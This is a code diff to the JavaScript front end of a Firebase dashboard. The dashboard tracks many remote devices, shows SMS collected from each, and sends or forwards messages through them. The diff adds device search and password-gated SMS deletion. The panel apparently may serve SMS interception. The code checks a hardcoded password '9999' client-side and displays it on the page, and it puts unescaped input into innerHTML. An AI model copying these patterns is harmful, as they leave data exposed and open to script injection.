@@ -1,5 +1,5 @@
 /* ============================================================ */
-/* app.js - Fixed: No Blink, No Auto-Refresh Jitter            */
+/* app.js - Complete Fixed: Search, Delete SMS, No Blink       */
 /* ============================================================ */
 
 // ============================================================
@@ -31,6 +31,7 @@ const DEVICE_LIMIT = 5;
 let allDeviceKeys = [];
 let filteredDeviceKeys = [];
 let currentFilter = 'all';
+let searchQuery = '';
 let allSmsList = [];
 let allSmsOffset = 0;
 const SMS_LIMIT = 10;
@@ -45,7 +46,9 @@ let isUpdatingUI = false;
 let deviceOnlineStatus = {};
 let renderTimeout = null;
 let lastRenderTime = 0;
-const MIN_RENDER_INTERVAL = 500;
+const MIN_RENDER_INTERVAL = 300;
+let lastDataHash = '';
+let deletePassword = '9999';
 
 // ============================================================
 // DOM REFS
@@ -71,28 +74,24 @@ db.ref(".info/connected").on("value", (snap) => {
 // MAIN DATA LISTENER - NO BLINK
 // ============================================================
 let firstLoad = true;
-let lastDataHash = '';
 
 db.ref().on("value", (snapshot) => {
     const newData = snapshot.val() || {};
     
-    // Create hash of data to check if actually changed
     const newHash = JSON.stringify(newData);
     if (newHash === lastDataHash) {
-        return; // No change, skip completely
+        return;
     }
     
     cachedData = newData;
     lastDataHash = newHash;
 
-    // Update device online status
     updateDeviceOnlineStatus();
 
     const active = document.activeElement;
     const typing = active && (active.tagName === 'INPUT' || active.tagName === 'TEXTAREA' || active.tagName === 'SELECT');
     if (typing) return;
 
-    // Throttle render calls
     const now = Date.now();
     if (now - lastRenderTime < MIN_RENDER_INTERVAL) {
         if (renderTimeout) clearTimeout(renderTimeout);
@@ -131,6 +130,101 @@ function updateDeviceOnlineStatus() {
         const currentTime = Date.now();
         const isRecent = (currentTime - lastSeen) < 120000;
         deviceOnlineStatus[devId] = isOnline || isRecent;
+    });
+}
+
+// ============================================================
+// SEARCH DEVICES
+// ============================================================
+function searchDevices(query) {
+    searchQuery = query.toLowerCase().trim();
+    deviceOffset = 0;
+    renderDevices();
+}
+
+function clearSearch() {
+    searchQuery = '';
+    $('deviceSearchInput').value = '';
+    deviceOffset = 0;
+    renderDevices();
+}
+
+// ============================================================
+// DELETE ALL SMS - WITH PASSWORD
+// ============================================================
+function deleteAllSms() {
+    const password = prompt('🔐 Enter Password to Delete All SMS:');
+    if (password === null) return; // Cancel
+    
+    if (password !== deletePassword) {
+        showToast('❌ Incorrect Password!', 'error');
+        return;
+    }
+    
+    if (!confirm('⚠️ Are you sure you want to DELETE ALL SMS messages? This action cannot be undone!')) {
+        return;
+    }
+    
+    const smsData = cachedData.user_sms || {};
+    if (Object.keys(smsData).length === 0) {
+        showToast('📭 No SMS to delete', 'info');
+        return;
+    }
+    
+    showToast('⏳ Deleting all SMS...', 'info');
+    
+    // Delete all SMS from Firebase
+    const promises = [];
+    Object.keys(smsData).forEach(devId => {
+        promises.push(db.ref(`user_sms/${devId}`).remove());
+    });
+    
+    Promise.all(promises).then(() => {
+        showToast('✅ All SMS deleted successfully!', 'success');
+        // Clear cache
+        Object.keys(deviceSmsCache).forEach(key => {
+            deviceSmsCache[key] = { offset: 0, all: [] };
+        });
+        allSmsList = [];
+        allSmsOffset = 0;
+        renderAll();
+    }).catch(err => {
+        showToast('❌ Error deleting SMS: ' + err.message, 'error');
+    });
+}
+
+// ============================================================
+// DELETE SPECIFIC SMS - WITH PASSWORD
+// ============================================================
+function deleteDeviceSms(devId) {
+    const password = prompt('🔐 Enter Password to Delete SMS:');
+    if (password === null) return;
+    
+    if (password !== deletePassword) {
+        showToast('❌ Incorrect Password!', 'error');
+        return;
+    }
+    
+    if (!confirm(`⚠️ Delete all SMS for device ${devId}?`)) {
+        return;
+    }
+    
+    const smsData = cachedData.user_sms || {};
+    if (!smsData[devId] || Object.keys(smsData[devId]).length === 0) {
+        showToast('📭 No SMS for this device', 'info');
+        return;
+    }
+    
+    showToast(`⏳ Deleting SMS for ${devId}...`, 'info');
+    
+    db.ref(`user_sms/${devId}`).remove().then(() => {
+        showToast(`✅ SMS deleted for ${devId}`, 'success');
+        deviceSmsCache[devId] = { offset: 0, all: [] };
+        allSmsList = [];
+        allSmsOffset = 0;
+        renderAll();
+    }).catch(err => {
+        showToast('❌ Error: ' + err.message, 'error');
     });
 }
 
@@ -194,7 +288,7 @@ function updateDeviceStatusUI(devId, isOnline, lastSeen) {
 }
 
 // ============================================================
-// RENDER ALL - WITH THROTTLE
+// RENDER ALL
 // ============================================================
 function renderAll() {
     if (isRendering || isUpdatingUI) return;
@@ -322,7 +416,7 @@ function getDeviceSerial(devId) {
 }
 
 // ============================================================
-// RENDER DEVICES - NO BLINK
+// RENDER DEVICES - WITH SEARCH
 // ============================================================
 function renderDevices() {
     if (isUpdatingUI) return;
@@ -332,22 +426,40 @@ function renderDevices() {
 
     updateDeviceOnlineStatus();
 
-    allDeviceKeys.sort((a, b) => {
+    // Filter by search query first
+    let searchFiltered = allDeviceKeys;
+    if (searchQuery) {
+        searchFiltered = allDeviceKeys.filter(id => {
+            const dev = devices[id] || {};
+            const name = dev.d_name || dev.device_name || id;
+            const serial = getDeviceSerial(id);
+            const searchStr = (id + ' ' + name + ' ' + serial).toLowerCase();
+            return searchStr.includes(searchQuery);
+        });
+    }
+
+    // Sort by serial
+    searchFiltered.sort((a, b) => {
         const serialA = getDeviceSerial(a);
         const serialB = getDeviceSerial(b);
         return serialB - serialA;
     });
 
+    // Apply filter (online/offline/all)
     if (currentFilter === 'online') {
-        filteredDeviceKeys = allDeviceKeys.filter(id => isDeviceOnline(id));
+        filteredDeviceKeys = searchFiltered.filter(id => isDeviceOnline(id));
     } else if (currentFilter === 'offline') {
-        filteredDeviceKeys = allDeviceKeys.filter(id => !isDeviceOnline(id));
+        filteredDeviceKeys = searchFiltered.filter(id => !isDeviceOnline(id));
     } else {
-        filteredDeviceKeys = [...allDeviceKeys];
+        filteredDeviceKeys = searchFiltered;
     }
 
     if (filteredDeviceKeys.length === 0) {
-        container.innerHTML = `<div class="empty-luxury"><i class="fas fa-mobile-alt" style="font-size:32px;display:block;margin-bottom:10px;color:var(--text-muted);"></i>${currentFilter === 'all' ? 'No devices registered' : 'No ' + currentFilter + ' devices'}</div>`;
+        let msg = 'No devices found';
+        if (searchQuery) msg = 'No devices match "' + searchQuery + '"';
+        else if (currentFilter === 'online') msg = 'No online devices';
+        else if (currentFilter === 'offline') msg = 'No offline devices';
+        container.innerHTML = `<div class="empty-luxury"><i class="fas fa-search" style="font-size:32px;display:block;margin-bottom:10px;color:var(--text-muted);"></i>${msg}</div>`;
         return;
     }
 
@@ -457,13 +569,17 @@ function renderDevices() {
                         <button class="sub-btn ${activeTab === 'sendsms' ? 'active-sendsms' : ''}" onclick="event.stopPropagation();setTab('${devId}','sendsms')">✉️</button>
                         <button class="sub-btn ${activeTab === 'fwd' ? 'active-fwd' : ''}" onclick="event.stopPropagation();setTab('${devId}','fwd')">🔀</button>
                         <button class="sub-btn ${activeTab === 'backup' ? 'active-backup' : ''}" onclick="event.stopPropagation();setTab('${devId}','backup')">💾</button>
+                        <button class="sub-btn ${activeTab === 'delete' ? 'active-delete' : ''}" onclick="event.stopPropagation();setTab('${devId}','delete')" style="color:var(--red);">🗑️</button>
                     </div>
 
                     <!-- SMS Section -->
                     <div class="section-box ${activeTab === 'sms' ? 'active' : ''}" id="sec-sms-${devId}">
                         <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
                             <h4 style="color:var(--gold-light);margin:0;font-size:13px;">💬 SMS (${totalSms})</h4>
-                            <button onclick="event.stopPropagation();openSmsModal('${devId}')" style="background:var(--gold);color:#0c0e14;border:none;padding:2px 12px;border-radius:6px;font-size:10px;font-weight:600;cursor:pointer;">⛶ Full</button>
+                            <div>
+                                <button onclick="event.stopPropagation();openSmsModal('${devId}')" style="background:var(--gold);color:#0c0e14;border:none;padding:2px 12px;border-radius:6px;font-size:10px;font-weight:600;cursor:pointer;margin-right:4px;">⛶ Full</button>
+                                ${totalSms > 0 ? `<button onclick="event.stopPropagation();deleteDeviceSms('${devId}')" style="background:var(--red);color:#fff;border:none;padding:2px 12px;border-radius:6px;font-size:10px;font-weight:600;cursor:pointer;">🗑️ Delete</button>` : ''}
+                            </div>
                         </div>
                         <div class="sms-list-luxury">
                             ${renderSmsCards(devSmsList)}
@@ -536,6 +652,19 @@ function renderDevices() {
                         </div>
                         <div id="deviceBackup-${devId}" style="margin-top:8px;padding:8px;background:var(--bg-primary);border-radius:6px;border:1px solid var(--border-color);font-size:11px;color:var(--text-muted);">
                             Click Refresh to check status
+                        </div>
+                    </div>
+
+                    <!-- Delete Section -->
+                    <div class="section-box ${activeTab === 'delete' ? 'active' : ''}" id="sec-delete-${devId}" style="border-color:var(--red);">
+                        <h4 style="color:var(--red);font-size:13px;">🗑️ Delete Device Data</h4>
+                        <div style="display:flex;flex-direction:column;gap:8px;">
+                            <button class="btn-luxury btn-red" onclick="event.stopPropagation();deleteDeviceSms('${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;">
+                                <i class="fas fa-trash"></i> Delete All SMS
+                            </button>
+                        </div>
+                        <div style="margin-top:8px;font-size:10px;color:var(--text-muted);padding:8px;background:rgba(239,68,68,0.05);border-radius:6px;border:1px solid rgba(239,68,68,0.1);">
+                            ⚠️ Password required: <span style="color:var(--gold);font-weight:600;">9999</span>
                         </div>
                     </div>
                 </div>
@@ -633,6 +762,7 @@ function setTab(devId, tab) {
                 else if (btn.textContent.trim().includes('✉️') && targetTab === 'sendsms') btn.classList.add('active-sendsms');
                 else if (btn.textContent.trim().includes('🔀') && targetTab === 'fwd') btn.classList.add('active-fwd');
                 else if (btn.textContent.trim().includes('💾') && targetTab === 'backup') btn.classList.add('active-backup');
+                else if (btn.textContent.trim().includes('🗑️') && targetTab === 'delete') btn.classList.add('active-delete');
             });
         }
     } finally {
@@ -1271,7 +1401,7 @@ function escapeHtml(text) {
 }
 
 // ============================================================
-// BACKUP DEVICE SELECT LISTENER
+// DOM CONTENT LOADED
 // ============================================================
 document.addEventListener('DOMContentLoaded', function() {
     $('backupDeviceSelect').addEventListener('change', function() {
@@ -1286,4 +1416,12 @@ document.addEventListener('DOMContentLoaded', function() {
     });
 
     $('filterAll').classList.add('active');
+
+    // Search input listener
+    const searchInput = $('deviceSearchInput');
+    if (searchInput) {
+        searchInput.addEventListener('input', function() {
+            searchDevices(this.value);
+        });
+    }
 });
